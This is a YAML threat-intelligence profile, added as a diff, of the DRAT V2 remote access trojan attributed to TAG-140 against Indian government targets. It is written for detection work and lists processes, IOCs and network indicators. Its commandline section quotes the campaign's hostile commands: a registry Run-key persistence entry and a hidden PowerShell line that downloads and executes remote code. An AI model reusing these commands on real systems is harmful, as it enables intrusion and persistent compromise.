@@ -1,0 +1,59 @@
+description: DRAT V2 is a modified variant of the DRAT remote access trojan (RAT)
+  attributed to TAG-140, targeting Indian government organizations. This Delphi-compiled
+  variant updates its C2 protocol and expands functional capabilities, including arbitrary
+  shell command execution and enhanced file system interaction.
+attribution: TAG-140 / SideCopy / Transparent Tribe (APT36)
+malware_families:
+- DRAT V2
+- CurlBack
+- SparkRAT
+- AresRAT
+- Xeno RAT
+- AllaKore
+- ReverseRAT
+TTPs:
+  processes:
+  - mshta.exe
+  - BroaderAspectloader
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Edgre" /t REG_SZ /F /D "cmd /C start C:\Users\Public\USOShared-1de48789-1285\zuidrt.pdf
+  - mshta.exe "index.php/sysinte.hta"
+  - '"C:\\Windows\\System32\\cmd.exe" /c noway.bat'
+  - powershell.exe -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString("https://trade4wealth[.]in/index.php/dratsysinte")
+  scripting_engine:
+  - VBScript (sysinte.hta)
+  - PowerShell
+  registry_keys:
+  - HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  network_connections:
+  - executable: mshta.exe
+    destination: trade4wealth[.]in
+    port: 443
+  - executable: BroaderAspectloader
+    destination: trade4wealth[.]in
+    url: https://trade4wealth[.]in/index.php/sysinte
+  - executable: BroaderAspectloader
+    destination: email.gov[.]in[.]drdosurvey[.]info
+    url: https://email.gov[.]in[.]drdosurvey[.]info/content/pre
+  file_activity:
+  - C:\\Users\\Public\\survey.pdf
+  - C:\\Users\\Public\\noway.bat
+  - C:\\Users\\Public\\DRAT V2 payload (decompressed)
+  persistence:
+  - Registry Run Key: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  pipes: []
+  process_relations:
+  - mshta.exe -> BroaderAspectloader -> cmd.exe -> powershell.exe
+IOCs:
+- domain: trade4wealth[.]in
+- domain: email.gov[.]in[.]drdosurvey[.]info
+- url: https://email.gov[.]in[.]drdosurvey[.]info/content/pre
+- file_path: C:\\Users\\Public\\survey.pdf
+- file_path: C:\\Users\\Public\\noway.bat
+authors:
+- Insikt Group
+reference: https://www.recordedfuture.com/research/drat-v2-updated-drat-emerges-tag-140s-arsenal
+date_of_publication: June 19, 2025
+file_creation_date: June 23, 2025
